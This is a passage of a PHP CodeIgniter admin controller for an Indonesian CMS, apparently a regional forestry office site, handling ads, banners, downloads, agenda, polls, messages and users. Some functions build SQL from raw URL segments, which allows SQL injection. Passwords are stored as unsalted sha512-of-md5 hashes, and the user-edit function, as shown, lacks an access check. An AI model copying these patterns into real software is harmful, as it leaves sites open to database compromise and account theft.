            $this->load->library('upload', $config);
            $this->upload->do_upload('c');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                'username'=>$this->session->username,
                                'url'=>$this->input->post('b'),
                                'tgl_posting'=>date('Y-m-d'));
            }else{
                $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                'username'=>$this->session->username,
                                'url'=>$this->input->post('b'),
                                'gambar'=>$hasil['file_name'],
                                'tgl_posting'=>date('Y-m-d'));
            }
            $where = array('id_iklantengah' => $this->input->post('id'));
            $this->model_app->update('iklantengah', $data, $where);
			redirect($this->uri->segment(1).'/iklanhome');
		}else{
            if ($this->session->level=='admin'){
                $proses = $this->model_app->edit('iklantengah', array('id_iklantengah' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('iklantengah', array('id_iklantengah' => $id, 'username' => $this->session->username))->row_array();
            }
            $data = array('rows' => $proses);
			$this->template->load('administrator/template','administrator/mod_iklanhome/view_iklanhome_edit',$data);
		}
	}

	function delete_iklanhome(){
        cek_session_akses('iklanhome',$this->session->id_session);
		if ($this->session->level=='admin'){
            $id = array('id_iklantengah' => $this->uri->segment(3));
        }else{
            $id = array('id_iklantengah' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
        $this->model_app->delete('iklantengah',$id);
		redirect($this->uri->segment(1).'/iklanhome');
	}


    // Controller Modul Iklan Sidebar

    function iklansidebar(){
        cek_session_akses('iklansidebar',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_ordering('pasangiklan','id_pasangiklan','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('pasangiklan',array('username'=>$this->session->username),'id_pasangiklan','DESC');
        }
        $this->template->load('administrator/template','administrator/mod_iklansidebar/view_iklansidebar',$data);
    }

    function tambah_iklansidebar(){
        cek_session_akses('iklansidebar',$this->session->id_session);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_pasangiklan/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|swf';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('c');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                'username'=>$this->session->username,
                                'url'=>$this->input->post('b'),
                                'tgl_posting'=>date('Y-m-d'));
            }else{
                $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                'username'=>$this->session->username,
                                'url'=>$this->input->post('b'),
                                'gambar'=>$hasil['file_name'],
                                'tgl_posting'=>date('Y-m-d'));
            }
            $this->model_app->insert('pasangiklan',$data);
            redirect($this->uri->segment(1).'/iklansidebar');
        }else{
            $this->template->load('administrator/template','administrator/mod_iklansidebar/view_iklansidebar_tambah');
        }
    }

    function edit_iklansidebar(){
        cek_session_akses('iklansidebar',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_pasangiklan/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|swf';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('c');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                'username'=>$this->session->username,
                                'url'=>$this->input->post('b'),
                                'tgl_posting'=>date('Y-m-d'));
            }else{
                $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                'username'=>$this->session->username,
                                'url'=>$this->input->post('b'),
                                'gambar'=>$hasil['file_name'],
                                'tgl_posting'=>date('Y-m-d'));
            }
            $where = array('id_pasangiklan' => $this->input->post('id'));
            $this->model_app->update('pasangiklan', $data, $where);
            redirect($this->uri->segment(1).'/iklansidebar');
        }else{
            if ($this->session->level=='admin'){
                $proses = $this->model_app->edit('pasangiklan', array('id_pasangiklan' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('pasangiklan', array('id_pasangiklan' => $id, 'username' => $this->session->username))->row_array();
            }
            $data = array('rows' => $proses);
            $this->template->load('administrator/template','administrator/mod_iklansidebar/view_iklansidebar_edit',$data);
        }
    }

    function delete_iklansidebar(){
        cek_session_akses('iklansidebar',$this->session->id_session);
        if ($this->session->level=='admin'){
            $id = array('id_pasangiklan' => $this->uri->segment(3));
        }else{
            $id = array('id_pasangiklan' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
        $this->model_app->delete('pasangiklan',$id);
        redirect($this->uri->segment(1).'/iklansidebar');
    }


    // Controller Modul banner Link

    function banner(){
        cek_session_akses('banner',$this->session->id_session);
        $data['record'] = $this->db->query("SELECT * FROM banner a LEFT JOIN kategori_banner b ON a.id_kategori_banner=b.id_kategori_banner ORDER BY a.id_banner DESC");
        $this->template->load('administrator/template','administrator/mod_banner/view_banner',$data);
    }

    function tambah_banner(){
        cek_session_akses('banner',$this->session->id_session);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_banner/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|swf';
            $config['max_size'] = '5000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('gambar');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('id_kategori_banner'=>$this->db->escape_str($this->input->post('id_kategori_banner')),
                                'judul'=>$this->db->escape_str($this->input->post('a')),
                                'keterangan'=>($this->input->post('keterangan')),
                                'url'=>$this->input->post('b'),
                                'icon'=>$this->input->post('icon'),
                                'posisi'=>$this->input->post('posisi'),
                                'tgl_posting'=>date('Y-m-d'));
            }else{
                $data = array('id_kategori_banner'=>$this->db->escape_str($this->input->post('id_kategori_banner')),
                                'judul'=>$this->db->escape_str($this->input->post('a')),
                                'keterangan'=>($this->input->post('keterangan')),
                                'url'=>$this->input->post('b'),
                                'gambar'=>$hasil['file_name'],
                                'icon'=>$this->input->post('icon'),
                                'posisi'=>$this->input->post('posisi'),
                                'tgl_posting'=>date('Y-m-d'));
            }
            $this->model_app->insert('banner',$data);  
            redirect($this->uri->segment(1).'/banner');
        }else{
            $this->template->load('administrator/template','administrator/mod_banner/view_banner_tambah');
        }
    }

    function edit_banner(){
        cek_session_akses('banner',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_banner/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|swf';
            $config['max_size'] = '5000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('gambar');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('id_kategori_banner'=>$this->db->escape_str($this->input->post('id_kategori_banner')),
                                'judul'=>$this->db->escape_str($this->input->post('a')),
                                'keterangan'=>($this->input->post('keterangan')),
                                'url'=>$this->input->post('b'),
                                'icon'=>$this->input->post('icon'),
                                'posisi'=>$this->input->post('posisi'));
            }else{
                $data = array('id_kategori_banner'=>$this->db->escape_str($this->input->post('id_kategori_banner')),
                                'judul'=>$this->db->escape_str($this->input->post('a')),
                                'keterangan'=>($this->input->post('keterangan')),
                                'url'=>$this->input->post('b'),
                                'gambar'=>$hasil['file_name'],
                                'icon'=>$this->input->post('icon'),
                                'posisi'=>$this->input->post('posisi'));
            }
            $where = array('id_banner' => $this->input->post('id'));
            $this->model_app->update('banner', $data, $where);
            redirect($this->uri->segment(1).'/banner');
        }else{
            $proses = $this->model_app->edit('banner', array('id_banner' => $id))->row_array();
            $data = array('rows' => $proses);
            $this->template->load('administrator/template','administrator/mod_banner/view_banner_edit',$data);
        }
    }

    function delete_banner(){
        cek_session_akses('banner',$this->session->id_session);
        $id = array('id_banner' => $this->uri->segment(3));
        $this->model_app->delete('banner',$id);
        redirect($this->uri->segment(1).'/banner');
    }


    // Controller Modul Logo

    function logowebsite(){
        cek_session_akses('logowebsite',$this->session->id_session);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/logo/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|PNG';
            $config['max_size'] = '5000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('logo');
            $hasil=$this->upload->data();
            $datadb = array('gambar'=>$hasil['file_name']);
            $where = array('id_logo' => $this->input->post('id'));
            $this->model_app->update('logo', $datadb, $where);
            redirect($this->uri->segment(1).'/logowebsite');
        }else{
            $data['record'] = $this->model_app->view('logo');
            $this->template->load('administrator/template','administrator/mod_logowebsite/view_logowebsite',$data);
        }
    }


    // Controller Modul Template Website

    function templatewebsite(){
        cek_session_akses('templatewebsite',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_ordering('templates','id_templates','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('templates',array('username'=>$this->session->username),'id_templates','DESC');
        }
        $this->template->load('administrator/template','administrator/mod_template/view_template',$data);
    }

    function tambah_templatewebsite(){
        cek_session_akses('templatewebsite',$this->session->id_session);
        if (isset($_POST['submit'])){
            $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                'username'=>$this->session->username,
                                'pembuat'=>$this->input->post('b'),
                                'folder'=>$this->input->post('c'));
            $this->model_app->insert('templates',$data);
            redirect($this->uri->segment(1).'/templatewebsite');
        }else{
            $this->template->load('administrator/template','administrator/mod_template/view_template_tambah');
        }
    }

    function edit_templatewebsite(){
        cek_session_akses('templatewebsite',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                'username'=>$this->session->username,
                                'pembuat'=>$this->input->post('b'),
                                'folder'=>$this->input->post('c'));
            $where = array('id_templates' => $this->input->post('id'));
            $this->model_app->update('templates', $data, $where);
            redirect($this->uri->segment(1).'/templatewebsite');
        }else{
            if ($this->session->level=='admin'){
                $proses = $this->model_app->edit('templates', array('id_templates' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('templates', array('id_templates' => $id, 'username' => $this->session->username))->row_array();
            }
            $data = array('rows' => $proses);
            $this->template->load('administrator/template','administrator/mod_template/view_template_edit',$data);
        }
    }

    function aktif_templatewebsite(){
        cek_session_akses('templatewebsite',$this->session->id_session);
        $id = $this->uri->segment(3);
        if ($this->uri->segment(4)=='Y'){ $aktif = 'N'; }else{ $aktif = 'Y'; }

        $data = array('aktif'=>$aktif);
        $where = array('id_templates' => $id);
        $this->model_app->update('templates', $data, $where);

        $dataa = array('aktif'=>'N');
        $wheree = array('id_templates !=' => $id);
        $this->model_app->update('templates', $dataa, $wheree);

        redirect($this->uri->segment(1).'/templatewebsite');
    }

    function delete_templatewebsite(){
        cek_session_akses('templatewebsite',$this->session->id_session);
        if ($this->session->level=='admin'){
            $id = array('id_templates' => $this->uri->segment(3));
        }else{
            $id = array('id_templates' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
        $this->model_app->delete('templates',$id);
        redirect($this->uri->segment(1).'/templatewebsite');
    }


    // Controller Modul Download

    function background(){
        cek_session_akses('background',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $data = array('gambar'=>$this->input->post('a'));
            $where = array('id_background' => 1);
            $this->model_app->update('background', $data, $where);
            redirect($this->uri->segment(1).'/background');
        }else{
            $proses = $this->model_app->edit('background', array('id_background' => 1))->row_array();
            $data = array('rows' => $proses);
            $this->template->load('administrator/template','administrator/mod_background/view_background',$data);
        }
    }


	// Controller Modul Download

	function download(){
		cek_session_akses('download',$this->session->id_session);
		$data['record'] = $this->model_app->view_ordering('download','id_download','DESC');
		$this->template->load('administrator/template','administrator/mod_download/view_download',$data);
	}

	function tambah_download(){
		cek_session_akses('download',$this->session->id_session);
		if (isset($_POST['submit'])){
			$config['upload_path'] = 'asset/files/';
            $config['allowed_types'] = 'gif|jpg|png|zip|rar|pdf|doc|docx|ppt|pptx|xls|xlsx|txt|jpeg';
            $config['max_size'] = '25000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('b');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                    $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                  'jenis'=>$this->db->escape_str($this->input->post('aa')), 
				 'tgl_posting'=>date('Y-m-d'),
                                  'hits'=>'0');
            }else{
                    $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                  'jenis'=>$this->db->escape_str($this->input->post('aa')), 
				 'nama_file'=>$hasil['file_name'],
                                  'tgl_posting'=>date('Y-m-d'),
                                  'hits'=>'0');
            }
            $this->model_app->insert('download',$data);
			redirect($this->uri->segment(1).'/download');
		}else{
			$this->template->load('administrator/template','administrator/mod_download/view_download_tambah');
		}
	}

	function edit_download(){
		cek_session_akses('download',$this->session->id_session);
		$id = $this->uri->segment(3);
		if (isset($_POST['submit'])){
			$config['upload_path'] = 'asset/files/';
            $config['allowed_types'] = 'gif|jpg|png|zip|rar|pdf|doc|docx|ppt|pptx|xls|xlsx|txt|jpeg';
            $config['max_size'] = '25000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('b');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                    $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
				'jenis'=>$this->db->escape_str($this->input->post('aa')));
            }else{
                    $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
				'jenis'=>$this->db->escape_str($this->input->post('aa')),
                                'nama_file'=>$hasil['file_name']);
            }
            $where = array('id_download' => $this->input->post('id'));
            $this->model_app->update('download', $data, $where);
			redirect($this->uri->segment(1).'/download');
		}else{
			$proses = $this->model_app->edit('download', array('id_download' => $id))->row_array();
            $data = array('rows' => $proses);
			$this->template->load('administrator/template','administrator/mod_download/view_download_edit',$data);
		}
	}
	function delete_download(){
        cek_session_akses('download',$this->session->id_session);
        $row = $this->db->query("SELECT * FROM download where id_download='".$this->uri->segment(3)."'")->row_array();
        unlink('asset/files/'.$row['nama_file']);

        $id = array('id_download' => $this->uri->segment(3));
        $this->model_app->delete('download',$id);
		redirect($this->uri->segment(1).'/download');
	}


	// Controller Modul Agenda

	function agenda(){
		cek_session_akses('agenda',$this->session->id_session);
        if ($this->session->level=='admin'){
    		$data['record'] = $this->model_app->view_ordering('agenda','id_agenda','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('agenda',array('username'=>$this->session->username),'id_agenda','DESC');
        }
		$this->template->load('administrator/template','administrator/mod_agenda/view_agenda',$data);
	}

	function tambah_agenda(){
		cek_session_akses('agenda',$this->session->id_session);
		if (isset($_POST['submit'])){
			$config['upload_path'] = 'asset/foto_agenda/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('c');
            $hasil=$this->upload->data();
            $ex = explode(' - ',$this->input->post('f'));
            $exx = explode('/',$ex[0]);
            $exy = explode('/',$ex[1]);
            $mulai = $exx[2].'-'.$exx[0].'-'.$exx[1];
            $selesai = $exy[2].'-'.$exy[0].'-'.$exy[1];
            if ($hasil['file_name']==''){
                    $data = array('tema'=>$this->db->escape_str($this->input->post('a')),
                                    'tema_seo'=>seo_title($this->input->post('a')),
                                    'isi_agenda'=>$this->input->post('b'),
                                    'tempat'=>$this->db->escape_str($this->input->post('d')),
                                    'pengirim'=>$this->db->escape_str($this->input->post('g')),
                                    'tgl_mulai'=>$mulai,
                                    'tgl_selesai'=>$selesai,
                                    'tgl_posting'=>date('Y-m-d'),
                                    'jam'=>$this->db->escape_str($this->input->post('e')),
                                    'dibaca'=>'0',
                                    'username'=>$this->session->username);
            }else{
                    $data = array('tema'=>$this->db->escape_str($this->input->post('a')),
                                    'tema_seo'=>seo_title($this->input->post('a')),
                                    'isi_agenda'=>$this->input->post('b'),
                                    'tempat'=>$this->db->escape_str($this->input->post('d')),
                                    'pengirim'=>$this->db->escape_str($this->input->post('g')),
                                    'gambar'=>$hasil['file_name'],
                                    'tgl_mulai'=>$mulai,
                                    'tgl_selesai'=>$selesai,
                                    'tgl_posting'=>date('Y-m-d'),
                                    'jam'=>$this->db->escape_str($this->input->post('e')),
                                    'dibaca'=>'0',
                                    'username'=>$this->session->username);
            }
            $this->model_app->insert('agenda',$data);
			redirect($this->uri->segment(1).'/agenda');
		}else{
			$this->template->load('administrator/template','administrator/mod_agenda/view_agenda_tambah');
		}
	}

	function edit_agenda(){
		cek_session_akses('agenda',$this->session->id_session);
		$id = $this->uri->segment(3);
		if (isset($_POST['submit'])){
			$config['upload_path'] = 'asset/foto_agenda/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('c');
            $hasil=$this->upload->data();
            $ex = explode(' - ',$this->input->post('f'));
            $exx = explode('/',$ex[0]);
            $exy = explode('/',$ex[1]);
            $mulai = $exx[2].'-'.$exx[0].'-'.$exx[1];
            $selesai = $exy[2].'-'.$exy[0].'-'.$exy[1];
            if ($hasil['file_name']==''){
                    $data = array('tema'=>$this->db->escape_str($this->input->post('a')),
                                    'tema_seo'=>seo_title($this->input->post('a')),
                                    'isi_agenda'=>$this->input->post('b'),
                                    'tempat'=>$this->db->escape_str($this->input->post('d')),
                                    'pengirim'=>$this->db->escape_str($this->input->post('g')),
                                    'tgl_mulai'=>$mulai,
                                    'tgl_selesai'=>$selesai,
                                    'jam'=>$this->db->escape_str($this->input->post('e')));
            }else{
                    $data = array('tema'=>$this->db->escape_str($this->input->post('a')),
                                    'tema_seo'=>seo_title($this->input->post('a')),
                                    'isi_agenda'=>$this->input->post('b'),
                                    'tempat'=>$this->db->escape_str($this->input->post('d')),
                                    'pengirim'=>$this->db->escape_str($this->input->post('g')),
                                    'gambar'=>$hasil['file_name'],
                                    'tgl_mulai'=>$mulai,
                                    'tgl_selesai'=>$selesai,
                                    'jam'=>$this->db->escape_str($this->input->post('e')));
            }
            
            $where = array('id_agenda' => $this->input->post('id'));
            $this->model_app->update('agenda', $data, $where);
			redirect($this->uri->segment(1).'/agenda');
		}else{
            if ($this->session->level=='admin'){
			     $proses = $this->model_app->edit('agenda', array('id_agenda' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('agenda', array('id_agenda' => $id, 'username' => $this->session->username))->row_array();
            }

            $data = array('rows' => $proses);
			$this->template->load('administrator/template','administrator/mod_agenda/view_agenda_edit',$data);
		}
	}

	function delete_agenda(){
        cek_session_akses('agenda',$this->session->id_session);
		if ($this->session->level=='admin'){
            $id = array('id_agenda' => $this->uri->segment(3));
        }else{
            $id = array('id_agenda' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
        $this->model_app->delete('agenda',$id);
		redirect($this->uri->segment(1).'/agenda');
	}


    // Controller Modul Sekilas Info

    function sekilasinfo(){
        cek_session_akses('sekilasinfo',$this->session->id_session);
        $data['record'] = $this->model_app->view_ordering('sekilasinfo','id_sekilas','DESC');
        $this->template->load('administrator/template','administrator/mod_sekilasinfo/view_sekilasinfo',$data);
    }

    function tambah_sekilasinfo(){
        cek_session_akses('sekilasinfo',$this->session->id_session);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_info/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '2500'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('b');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('info'=>$this->input->post('a'),
                              'tgl_posting'=>date('Y-m-d'),
                              'aktif'=>'Y');
            }else{
                $data = array('info'=>$this->input->post('a'),
                              'tgl_posting'=>date('Y-m-d'),
                              'gambar'=>$hasil['file_name'],
                              'aktif'=>'Y');
            }
            $this->model_app->insert('sekilasinfo',$data);
            redirect($this->uri->segment(1).'/sekilasinfo');
        }else{
            $this->template->load('administrator/template','administrator/mod_sekilasinfo/view_sekilasinfo_tambah');
        }
    }

    function edit_sekilasinfo(){
        cek_session_akses('sekilasinfo',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_info/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '2500'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('b');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('info'=>$this->input->post('a'),
                              'aktif'=>$this->input->post('f'));
            }else{
                $data = array('info'=>$this->input->post('a'),
                              'gambar'=>$hasil['file_name'],
                              'aktif'=>$this->input->post('f'));
            }

            $where = array('id_sekilas' => $this->input->post('id'));
            $this->model_app->update('sekilasinfo', $data, $where);
            redirect($this->uri->segment(1).'/sekilasinfo');
        }else{
            $proses = $this->model_app->edit('sekilasinfo', array('id_sekilas' => $id))->row_array();
            $data = array('rows' => $proses);
            $this->template->load('administrator/template','administrator/mod_sekilasinfo/view_sekilasinfo_edit',$data);
        }
    }

    function delete_sekilasinfo(){
        cek_session_akses('sekilasinfo',$this->session->id_session);
        $id = array('id_sekilas' => $this->uri->segment(3));
        $this->model_app->delete('sekilasinfo',$id);
        redirect($this->uri->segment(1).'/sekilasinfo');
    }



    // Controller Modul Jajak Pendapat

    function jajakpendapat(){
        cek_session_akses('jajakpendapat',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_ordering('poling','id_poling','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('poling',array('username'=>$this->session->username),'id_poling','DESC');
        }
        $this->template->load('administrator/template','administrator/mod_jajakpendapat/view_jajakpendapat',$data);
    }

    function tambah_jajakpendapat(){
        cek_session_akses('jajakpendapat',$this->session->id_session);
        if (isset($_POST['submit'])){
            $data = array('pilihan'=>$this->input->post('a'),
                          'status'=>$this->input->post('b'),
                          'username'=>$this->session->username,
                          'rating'=>'0',
                          'aktif'=>$this->input->post('c'));
            $this->model_app->insert('poling',$data);
            redirect($this->uri->segment(1).'/jajakpendapat');
        }else{
            $this->template->load('administrator/template','administrator/mod_jajakpendapat/view_jajakpendapat_tambah');
        }
    }

    function edit_jajakpendapat(){
        cek_session_akses('jajakpendapat',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $data = array('pilihan'=>$this->input->post('a'),
                          'status'=>$this->input->post('b'),
                          'aktif'=>$this->input->post('c'));
            $where = array('id_poling' => $this->input->post('id'));
            $this->model_app->update('poling', $data, $where);
            redirect($this->uri->segment(1).'/jajakpendapat');
        }else{
            if ($this->session->level=='admin'){
                 $proses = $this->model_app->edit('poling', array('id_poling' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('poling', array('id_poling' => $id, 'username' => $this->session->username))->row_array();
            }
            $data = array('rows' => $proses);
            $this->template->load('administrator/template','administrator/mod_jajakpendapat/view_jajakpendapat_edit',$data);
        }
    }

    function delete_jajakpendapat(){
        cek_session_akses('jajakpendapat',$this->session->id_session);
        if ($this->session->level=='admin'){
            $id = array('id_poling' => $this->uri->segment(3));
        }else{
            $id = array('id_poling' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
        $this->model_app->delete('poling',$id);
        redirect($this->uri->segment(1).'/jajakpendapat');
    }


	// Controller Modul YM

	function ym(){
		cek_session_akses('ym',$this->session->id_session);
		$data['record'] = $this->model_app->view_ordering('mod_ym','id','DESC');
		$this->template->load('administrator/template','administrator/mod_ym/view_ym',$data);
	}

	function tambah_ym(){
		cek_session_akses('ym',$this->session->id_session);
		if (isset($_POST['submit'])){
			$data = array('nama'=>$this->db->escape_str($this->input->post('a')),
                        'username'=>seo_title($this->input->post('b')),
                        'ym_icon'=>$this->input->post('c'));
            $this->model_app->insert('mod_ym',$data);
			redirect($this->uri->segment(1).'/ym');
		}else{
			$this->template->load('administrator/template','administrator/mod_ym/view_ym_tambah');
		}
	}

	function edit_ym(){
		cek_session_akses('ym',$this->session->id_session);
		$id = $this->uri->segment(3);
		if (isset($_POST['submit'])){
			$data = array('nama'=>$this->db->escape_str($this->input->post('a')),
                        'username'=>seo_title($this->input->post('b')),
                        'ym_icon'=>$this->input->post('c'));
            $where = array('id' => $this->input->post('id'));
            $this->model_app->update('mod_ym', $data, $where);
			redirect($this->uri->segment(1).'/ym');
		}else{
			$proses = $this->model_app->edit('mod_ym', array('id' => $id))->row_array();
            $data = array('rows' => $proses);
			$this->template->load('administrator/template','administrator/mod_ym/view_ym_edit',$data);
		}
	}

	function delete_ym(){
        cek_session_akses('ym',$this->session->id_session);
		$id = array('id' => $this->uri->segment(3));
        $this->model_app->delete('mod_ym',$id);
		redirect($this->uri->segment(1).'/ym');
	}

    // Controller Modul Alamat

    function informasi(){
        cek_session_akses('informasi',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $data = array('judul'=>$this->input->post('judul'),'alamat'=>$this->input->post('a'));
            $where = array('id_alamat' => $id);
            $this->model_app->update('mod_alamat', $data, $where);
            redirect($this->uri->segment(1).'/informasi/'.$id);
        }else{
            $proses = $this->model_app->edit('mod_alamat', array('id_alamat' =>$this->uri->segment('3')))->row_array();
            $data = array('rows' => $proses);
            $this->template->load('administrator/template','administrator/mod_alamat/view_alamat',$data);
        }
    }


	// Controller Modul Pesan Masuk

	function pesanmasuk(){
		cek_session_akses('pesanmasuk',$this->session->id_session);
		$data['record'] = $this->model_app->view_ordering('hubungi','id_hubungi','DESC');
		$this->template->load('administrator/template','administrator/mod_pesanmasuk/view_pesanmasuk',$data);
	}

	function detail_pesanmasuk(){
		cek_session_akses('pesanmasuk',$this->session->id_session);
		$id = $this->uri->segment(3);
		$this->db->query("UPDATE hubungi SET dibaca='Y' where id_hubungi='$id'");
		if (isset($_POST['submit'])){
			$nama           = $this->input->post('a');
            $email           = $this->input->post('b');
            $subject         = $this->input->post('c');
            $message         = $this->input->post('isi')." <br><hr><br> ".$this->input->post('d');
            
            $this->email->from('Kmyteta@gmail.com', 'DISHUT.KALSEL.CO.ID');
            $this->email->to($email);
            $this->email->cc('');
            $this->email->bcc('');

            $this->email->subject($subject);
            $this->email->message($message);
            $this->email->set_mailtype("html");
            $this->email->send();
            
            $config['protocol'] = 'sendmail';
            $config['mailpath'] = '/usr/sbin/sendmail';
            $config['charset'] = 'utf-8';
            $config['wordwrap'] = TRUE;
            $config['mailtype'] = 'html';
            $this->email->initialize($config);

			$proses = $this->model_app->edit('hubungi', array('id_hubungi' => $id))->row_array();
            $data = array('rows' => $proses);
			$this->template->load('administrator/template','administrator/mod_pesanmasuk/view_pesanmasuk_detail',$data);
		}else{
			$proses = $this->model_app->edit('hubungi', array('id_hubungi' => $id))->row_array();
            $data = array('rows' => $proses);
			$this->template->load('administrator/template','administrator/mod_pesanmasuk/view_pesanmasuk_detail',$data);
		}
	}

	function delete_pesanmasuk(){
        cek_session_akses('pesanmasuk',$this->session->id_session);
		$id = array('id_hubungi' => $this->uri->segment(3));
        $this->model_app->delete('hubungi',$id);
		redirect($this->uri->segment(1).'/pesanmasuk');
	}


	// Controller Modul User

	function manajemenuser(){
		cek_session_akses('manajemenuser',$this->session->id_session);
		$data['record'] = $this->model_app->view_ordering('users','username','DESC');
		$this->template->load('administrator/template','administrator/mod_users/view_users',$data);
	}

	function tambah_manajemenuser(){
		cek_session_akses('manajemenuser',$this->session->id_session);
		$id = $this->session->username;
		if (isset($_POST['submit'])){
			$config['upload_path'] = 'asset/foto_user/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '1000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('f');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                    $data = array('username'=>$this->db->escape_str($this->input->post('a')),
                                    'password'=>hash("sha512", md5($this->input->post('b'))),
                                    'nama_lengkap'=>$this->db->escape_str($this->input->post('c')),
                                    'email'=>$this->db->escape_str($this->input->post('d')),
                                    'no_telp'=>$this->db->escape_str($this->input->post('e')),
                                    'level'=>$this->db->escape_str($this->input->post('g')),
                                    'blokir'=>'N',
                                    'id_session'=>md5($this->input->post('a')).'-'.date('YmdHis'));
            }else{
                    $data = array('username'=>$this->db->escape_str($this->input->post('a')),
                                    'password'=>hash("sha512", md5($this->input->post('b'))),
                                    'nama_lengkap'=>$this->db->escape_str($this->input->post('c')),
                                    'email'=>$this->db->escape_str($this->input->post('d')),
                                    'no_telp'=>$this->db->escape_str($this->input->post('e')),
                                    'foto'=>$hasil['file_name'],
                                    'level'=>$this->db->escape_str($this->input->post('g')),
                                    'blokir'=>'N',
                                    'id_session'=>md5($this->input->post('a')).'-'.date('YmdHis'));
            }
            $this->model_app->insert('users',$data);

              $mod=count($this->input->post('modul'));
              $modul=$this->input->post('modul');
              $sess = md5($this->input->post('a')).'-'.date('YmdHis');
              for($i=0;$i<$mod;$i++){
                $datam = array('id_session'=>$sess,
                              'id_modul'=>$modul[$i]);
                $this->model_app->insert('users_modul',$datam);
              }

			redirect($this->uri->segment(1).'/edit_manajemenuser/'.$this->input->post('a'));
		}else{
            $proses = $this->model_app->view_where_ordering('modul', array('publish' => 'Y','status' => 'user'), 'id_modul','DESC');
            $data = array('record' => $proses);
			$this->template->load('administrator/template','administrator/mod_users/view_users_tambah',$data);
		}
	}

	function edit_manajemenuser(){
		$id = $this->uri->segment(3);
		if (isset($_POST['submit'])){
			$config['upload_path'] = 'asset/foto_user/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '1000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('f');
            $hasil=$this->upload->data();
            if ($hasil['file_name']=='' AND $this->input->post('b') ==''){
                    $data = array('username'=>$this->db->escape_str($this->input->post('a')),
                                    'nama_lengkap'=>$this->db->escape_str($this->input->post('c')),
                                    'email'=>$this->db->escape_str($this->input->post('d')),
                                    'no_telp'=>$this->db->escape_str($this->input->post('e')),
